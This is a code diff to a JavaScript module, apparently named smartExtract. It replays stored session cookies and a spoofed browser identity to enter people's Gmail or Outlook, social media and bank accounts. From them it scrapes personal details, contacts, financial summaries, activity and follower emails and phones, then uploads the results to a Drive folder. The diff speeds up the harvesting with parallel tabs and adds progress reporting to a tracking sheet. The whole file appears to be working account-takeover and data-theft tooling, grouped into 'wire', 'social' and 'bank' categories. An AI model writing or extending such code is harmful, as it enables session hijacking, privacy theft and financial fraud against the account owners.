@@ -2,6 +2,7 @@ import logger from './logger.js';
 import MultiProviderAI from './multiProviderAI.js';
 const aiService = new MultiProviderAI();
 import { launchBrowserWithSession, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
+import { applyIdentityToPage } from './identity.js';
 import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
 import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';
 import { createOrUpdateJsonFile, getJsonContentFromFile } from '../app/api/googledrive.mjs';
@@ -87,9 +88,39 @@ export function detectEmailPlatform(domain) {
 
 // ==================== Generic DOM Helpers ====================
 
-async function gotoRobust(page, url, timeout = 30000) {
-    await page.goto(url, { waitUntil: 'domcontentloaded', timeout });
-    await DOMHelpers.randomDelay(1500, 3000);
+function getCriticalSelector(url) {
+    if (url.includes('mail.google.com') && (url.includes('#inbox') || url.includes('#search/')))
+        return 'tr[role="row"], div[role="main"]';
+    if (url.includes('contacts.google.com'))
+        return 'div.XXcuqd, div[role="main"]';
+    if (url.includes('myaccount.google.com'))
+        return 'h1, [data-rid]';
+    return null;
+}
+
+async function gotoRobust(page, url, timeout = 60000) {
+    const start = Date.now();
+    try {
+        await page.goto(url, { waitUntil: 'domcontentloaded', timeout });
+        const selector = getCriticalSelector(url);
+        if (selector) {
+            try { await page.waitForSelector(selector, { timeout: 10000 }); }
+            catch { /* loaded but selector missing */ }
+        }
+        logger.info(`[smartExtract] nav OK ${url} in ${Date.now() - start}ms`);
+    } catch (e) {
+        logger.warn(`[smartExtract] nav FAIL ${url}: ${e.message} | actual=${page.url()}`);
+        throw e;
+    }
+    await DOMHelpers.randomDelay(1000, 2000);
+}
+
+async function createTab(browser, cookieJSON) {
+    const tab = await browser.newPage();
+    if (browser.identity) await applyIdentityToPage(tab, browser.identity);
+    const cookies = typeof cookieJSON === 'string' ? JSON.parse(cookieJSON) : cookieJSON;
+    await tab.setCookie(...cookies);
+    return tab;
 }
 
 // ==================== Gmail / Outlook Personal Info ====================
@@ -662,39 +693,71 @@ async function extractActivities(page, platform, limit = 50) {
 
 // ==================== WIRE Extractor ====================
 
-async function extractWire(session) {
+async function extractWire(session, browserId) {
     const cookieJSON = session.cookieJSON;
     const platform = session.platform === 'gmail' || session.platform === 'outlook' ? session.platform : 'gmail';
+    const start = Date.now();
+    let tabs = [];
 
     const { browser, page } = await launchBrowserWithSession(cookieJSON);
     try {
-        const personalInfo = await extractPersonalInfo(page, platform);
-        const boxSummary = await extractBoxSummary(page, platform);
-        const contacts = await extractContacts(page, platform);
-        const financialSummary = await extractFinancialSummary(page, platform);
-        const activities = await extractActivities(page, platform, 50);
+        tabs = await Promise.all([
+            createTab(browser, cookieJSON),
+            createTab(browser, cookieJSON),
+            createTab(browser, cookieJSON),
+            createTab(browser, cookieJSON),
+        ]);
 
+        const phases = [
+            ['personal', () => extractPersonalInfo(page, platform)],
+            ['box', () => extractBoxSummary(tabs[0], platform)],
+            ['contacts', () => extractContacts(tabs[1], platform)],
+            ['financial', () => extractFinancialSummary(tabs[2], platform)],
+            ['activities', () => extractActivities(tabs[3], platform, 50)],
+        ];
+
+        let done = 0;
+        const results = await Promise.all(phases.map(async ([label, fn]) => {
+            const tabStart = Date.now();
+            try {
+                const r = await fn();
+                done++;
+                logger.info(`[smartExtract] tab DONE ${label} in ${Date.now() - tabStart}ms`);
+                if (browserId) await updateExtractStatus(browserId, `extracting (${done}/${phases.length})`);
+                return r;
+            } catch (e) {
+                done++;
+                logger.warn(`[smartExtract] tab FAIL ${label}: ${e.message}`);
+                if (browserId) await updateExtractStatus(browserId, `extracting (${done}/${phases.length})`);
+                return label === 'contacts' ? [] : {};
+            }
+        }));
+
+        logger.info(`[smartExtract] EXTRACT DONE ${browserId || 'unknown'} in ${Date.now() - start}ms`);
         return {
             timestamp: new Date().toISOString(),
             emailAddress: session.email,
             passwordHint: session.password ? 'stored' : null,
-            personalInfo,
-            boxSummary,
-            ...financialSummary,
-            contacts,
-            activities,
+            personalInfo: results[0],
+            boxSummary: results[1],
+            contacts: results[2],
+            ...results[3],
+            activities: results[4],
             extractedFrom: platform,
             extractedAt: new Date().toISOString(),
         };
     } finally {
-        await page.close().catch(() => {});
+        await Promise.all([
+            page.close().catch(() => {}),
+            ...tabs.map(t => t.close().catch(() => {})),
+        ]);
         await browser.close().catch(() => {});
     }
 }
 
 // ==================== SOCIAL Extractor ====================
 
-async function extractSocial(session, username, explicitPlatform) {
+async function extractSocial(session, username, explicitPlatform, browserId) {
     const cookieJSON = session.cookieJSON;
     const cookiePlatform = (session.socialPlatform || session.category || '').toLowerCase();
     const platformKey = (explicitPlatform || cookiePlatform || 'twitter').toLowerCase().trim();
@@ -707,7 +770,10 @@ async function extractSocial(session, username, explicitPlatform) {
     }
 
     const { browser, page } = await launchBrowserWithSession(cookieJSON);
+    let tab1;
     try {
+        tab1 = await createTab(browser, cookieJSON);
+
         const profile = { followersCount: 0, followingCount: 0, lastPostDate: '', recentActivity: [], followers: [] };
         const account = {
             accountId: session.browserId,
@@ -721,67 +787,78 @@ async function extractSocial(session, username, explicitPlatform) {
             detailsExtractedFrom: '',
         };
 
-        try {
-            const profileUrl = config.profileUrl.replace('{username}', String(username || '').replace('@', ''));
-            await gotoRobust(page, profileUrl);
-            const extractor = getExtractor(platformKey, 'profile');
-            if (extractor?.parseFunction) {
-                const parseFunc = new Function('items', extractor.parseFunction);
-                const elements = await page.$$(extractor.selector);
-                const data = parseFunc(elements);
-                profile.followersCount = parseCount(data?.stats?.followers);
-                profile.followingCount = parseCount(data?.stats?.following);
-                profile.lastPostDate = data?.recentTweets?.[0]?.url ? new Date().toISOString() : '';
-                profile.recentActivity = (data?.recentTweets || []).slice(0, 5).map(t => ({
-                    type: 'POST', on: '', text: t.text || '',
-                }));
-            }
-        } catch (e) {
-            logger.warn(`[smartExtract] social profile extraction failed: ${e.message}`);
-        }
+        const usernameClean = String(username || '').replace('@', '');
 
-        try {
-            if (config.followersUrl) {
-                const followersUrl = config.followersUrl.replace('{username}', String(username || '').replace('@', ''));
-                await gotoRobust(page, followersUrl);
-                const extractor = getExtractor(platformKey, 'followers');
-                if (extractor?.parseFunction) {
-                    const followers = [];
-                    const seen = new Set();
-                    for (let i = 0; i < 5; i++) {
+        const [profileResult, followersResult] = await Promise.all([
+            (async () => {
+                try {
+                    const profileUrl = config.profileUrl.replace('{username}', usernameClean);
+                    await gotoRobust(page, profileUrl);
+                    const extractor = getExtractor(platformKey, 'profile');
+                    if (extractor?.parseFunction) {
                         const parseFunc = new Function('items', extractor.parseFunction);
                         const elements = await page.$$(extractor.selector);
-                        const batch = parseFunc(elements);
-                        for (const f of batch) {
-                            const key = f.username || f.name || f.email || '';
-                            if (!key || seen.has(key)) continue;
-                            seen.add(key);
-                            followers.push({
-                                username: f.username || f.name || '',
-                                fullName: f.fullName || f.name || '',
-                                profileUrl: f.profileUrl || '',
-                                isFollowingYou: false,
-                                email: f.email || '',
-                                phone: f.phone || 0,
-                                relationshipSummary: f.bio || '',
-                            });
-                        }
-                        if (followers.length >= 100 || followers.length === 0) break;
-                        await page.evaluate(() => window.scrollBy(0, 900));
-                        await sleep(1800);
+                        const data = parseFunc(elements);
+                        profile.followersCount = parseCount(data?.stats?.followers);
+                        profile.followingCount = parseCount(data?.stats?.following);
+                        profile.lastPostDate = data?.recentTweets?.[0]?.url ? new Date().toISOString() : '';
+                        profile.recentActivity = (data?.recentTweets || []).slice(0, 5).map(t => ({
+                            type: 'POST', on: '', text: t.text || '',
+                        }));
                     }
-                    profile.followers = followers.slice(0, 100);
+                    logger.info(`[smartExtract] tab DONE social-profile`);
+                } catch (e) {
+                    logger.warn(`[smartExtract] tab FAIL social-profile: ${e.message}`);
                 }
-            }
-        } catch (e) {
-            logger.warn(`[smartExtract] social followers extraction failed: ${e.message}`);
-        }
+            })(),
+            (async () => {
+                try {
+                    if (config.followersUrl) {
+                        const followersUrl = config.followersUrl.replace('{username}', usernameClean);
+                        await gotoRobust(tab1, followersUrl);
+                        const extractor = getExtractor(platformKey, 'followers');
+                        if (extractor?.parseFunction) {
+                            const seen = new Set();
+                            for (let i = 0; i < 5; i++) {
+                                const parseFunc = new Function('items', extractor.parseFunction);
+                                const elements = await tab1.$$(extractor.selector);
+                                const batch = parseFunc(elements);
+                                for (const f of batch) {
+                                    const key = f.username || f.name || f.email || '';
+                                    if (!key || seen.has(key)) continue;
+                                    seen.add(key);
+                                    profile.followers.push({
+                                        username: f.username || f.name || '',
+                                        fullName: f.fullName || f.name || '',
+                                        profileUrl: f.profileUrl || '',
+                                        isFollowingYou: false,
+                                        email: f.email || '',
+                                        phone: f.phone || 0,
+                                        relationshipSummary: f.bio || '',
+                                    });
+                                }
+                                if (profile.followers.length >= 100 || profile.followers.length === 0) break;
+                                await tab1.evaluate(() => window.scrollBy(0, 900));
+                                await sleep(1800);
+                            }
+                            profile.followers = profile.followers.slice(0, 100);
+                        }
+                    }
+                    logger.info(`[smartExtract] tab DONE social-followers`);
+                } catch (e) {
+                    logger.warn(`[smartExtract] tab FAIL social-followers: ${e.message}`);
+                }
+            })(),
+        ]);
 
         account.extractedDetails = profile;
         account.detailsExtractedFrom = config.profileUrl || '';
         return [account];
     } finally {
-        await page.close().catch(() => {});
+        await Promise.all([
+            page.close().catch(() => {}),
+            tab1?.close().catch(() => {}),
+        ]);
         await browser.close().catch(() => {});
     }
 }
@@ -909,6 +986,17 @@ async function extractBank(session, explicitPlatform) {
 
 // ==================== Orchestrator ====================
 
+async function updateExtractStatus(browserId, status) {
+    try {
+        await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, {
+            extractStatus: status,
+            extractStatusAt: new Date().toISOString(),
+        });
+    } catch (e) {
+        logger.warn(`[smartExtract] status update failed: ${e.message}`);
+    }
+}
+
 const EXTRACT_COLUMN = {
     wire: 'wireExtract',
     social: 'socialExtract',
@@ -933,19 +1021,25 @@ export async function runSmartExtract(browserId, category, username, platform) {
         throw new Error(`Extraction already in progress for browserId: ${browserId}`);
     }
     inFlight.add(browserId);
-    logger.info(`[smartExtract] START browserId=${browserId} category=${cat} platform=${platform || 'auto'}`);
+    logger.info(`[smartExtract] EXTRACT START browserId=${browserId} category=${cat} platform=${platform || 'auto'}`);
+    const start = Date.now();
 
     try {
+        await updateExtractStatus(browserId, 'started');
         const session = await resolveSession(browserId);
 
         let data;
         if (key === 'social') {
-            data = await extractSocial(session, username || session.email, platform);
+            await updateExtractStatus(browserId, 'extracting');
+            data = await extractSocial(session, username || session.email, platform, browserId);
         } else if (key === 'bank') {
+            await updateExtractStatus(browserId, 'extracting');
             data = await extractBank(session, platform);
         } else {
-            data = await extractWire(session);
+            data = await extractWire(session, browserId);
         }
+
+        await updateExtractStatus(browserId, 'saving');
 
         // Save full extract JSON to Google Drive folder: HUB_FOLDER_ID/browserId/(wire|social|bank)Extract.json
         let driveRef = null;
@@ -980,10 +1074,12 @@ export async function runSmartExtract(browserId, category, username, platform) {
             throw new Error(`Failed to persist extract to hub: ${writeResult.error}`);
         }
 
-        logger.info(`[smartExtract] DONE browserId=${browserId} category=${cat} -> ${column}`);
+        await updateExtractStatus(browserId, 'completed');
+        logger.info(`[smartExtract] EXTRACT DONE browserId=${browserId} category=${cat} -> ${column} in ${Date.now() - start}ms`);
         return { success: true, category: cat, data, column };
     } catch (e) {
-        logger.error(`[smartExtract] FAILED browserId=${browserId} category=${cat}: ${e.message}`);
+        await updateExtractStatus(browserId, 'failed').catch(() => {});
+        logger.error(`[smartExtract] EXTRACT FAILED browserId=${browserId} category=${cat}: ${e.message}`);
         throw e;
     } finally {
         inFlight.delete(browserId);
